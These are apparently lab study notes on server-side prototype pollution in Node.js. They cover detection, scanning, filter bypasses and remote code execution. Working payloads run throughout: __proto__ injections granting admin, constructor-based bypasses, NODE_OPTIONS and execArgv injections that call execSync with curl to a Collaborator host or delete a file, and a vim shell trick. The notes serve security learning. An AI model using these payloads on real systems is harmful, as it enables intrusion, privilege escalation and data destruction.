# Server-side prototype pollution

More difficult to detect:

* No source code access
* Lack of developer tools (only applies to black box testing)
* DoS problem
* Pollution persistence: when tested in a browser, can reverse changes and get a clean environment by refreshing. On server-side it persists for the lifetime of the node process.

## Detecting via polluted property reflection

Developers can forget that JS for...in loop itereates all porperties, included inherited ones via prototype chain (doesn't inclide built-in properties set by JS native constructors)

`const myObject = { a: 1, b: 2 };`

pollute the prototype with an arbitrary property

`Object.prototype.foo = 'bar';`

confirm myObject doesn't have its own foo property

`myObject.hasOwnProperty('foo');` // false

list names of properties of myObject
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
for(const propertyKey in myObject){
    console.log(propertyKey);
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Output: a, b, foo


Also applies to arrays: 

const myArray = ['a','b'];
Object.prototype.foo = 'bar';
for(const arrayKey in myArray){
    console.log(arrayKey);
}
// Output: 0, 1, foo

Good candidates are POST / PUT that submit JSON
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /user/update HTTP/1.1
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "admin":true
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Response:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### Example:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"address_line_1":"Wiener1 HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"5NL1tc3YRZKtWR3Ky9xpECoQbNlLfT5k",
"__proto__":{
        "isAdmin":true
    }}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## Scanning for server-side prototype pollution sources

1. Server-Side Prototype Pollution Scanner extension and enable
2. Explore website
3. On history filter by scope, select all and send to extension, maybe change config and OK.

It will be reported on the Issue activity on Dashboard and Target

In community edition: monitor Output tab

## Bypassing input filters for server-side prototype pollution

Websites try to prevent filtering `__proto__`

It can be bypassed: obfuscate prohibited keywords or access via the constructor instead of `__proto__`

Node applications can delete or disable `__proto__` using flags `--disable-proto=delete` or `--disable-proto=throw` respectively. It can also be bypassed with the constructor.

### Example:

constructor + spaces override

See the normal request in raw tab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"constructor":{"prototype" :{
"json spaces":10}
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Then check identation in raw tab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"constructor":{"prototype" :{
"isAdmin":true}
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Remote code execution via server-side prototype pollution

Client-side prototype pollution tipically exposes vulnerable site to DOM XSS, server-side pollution can result in RCE

Node has a lot of potential command execution sinks, many occur in `child_process` module, which are often invoked by an asynchronous request that is pollutable. Can use collaborator.

`NODE_OPTIONS` environment defines command-line arguments for starting a Node process. Since is an env object, it can have prototype pollution.

`shell` property enables to run commands, together with `NODE_OPTIONS` causes interaction with Collaborator, whenever a Node process is created
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*Scape quotes are not necesary, but can help reduce false positives obfuscating hostname to evade WAFs

## Remote code execution via child_process.fork()

`child_process.spawn()` and `child_process.fork()` create Node subprocesses. `fork()` accepts options object with a potential option `execArgv` property. If developers left it undefined, then can be polluted.

It allows to controll command-line args, otherwise not possible with `NODE_OPTIONS`.

`--eval` argument
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"execArgv": [
    "--eval=require('<module>')"
]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In addition to `fork()`, the `child_process` module contains the `execSync()` method, which executes arbitrary string as system command.

### Example:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Remote code execution via child_process.execSync()

Like `fork()`, the `execSync()` method also accepts options object, which can be pollutable. Although doesn't accept `execArgv` property, can still inject commands in a child process polluting both `shell` and input properties.

input option is a string passed to child process, and executed as system by `execSync()`. there are options for providing the command (ex. passing it as argument to the function), input may be left undefined.

`shell` option allows to specify shell. Defult, `execSync()` uses system's defaul shell to run commands, so can also be undefined.


Polluting these 2 properties, could override the command that the app intended to execute.

`shell` only accepts the name and not set any command/line args.

`shell` is executed with -c which for most shells is command by string, but for Node it runs a syntax check on the script, which prevents execution. There are workarounds.

`input` property containing payload is passed via stdin, the shell must accept commands from stdin.

## VIM
vim on server can lead to RCE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"shell":"vim",
"input":":! <command>\n"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*Vim has an interactive prompt and expects the user to hit Enter to run the provided command, simulated with `\n`


Some tools don't read from stdin by default, there are ways around this. `Curl` can read stdin and send contests as the body of a POST using `-d @- argument`.

Other cases can use xargs, converting stdin to args to be passed to a command.
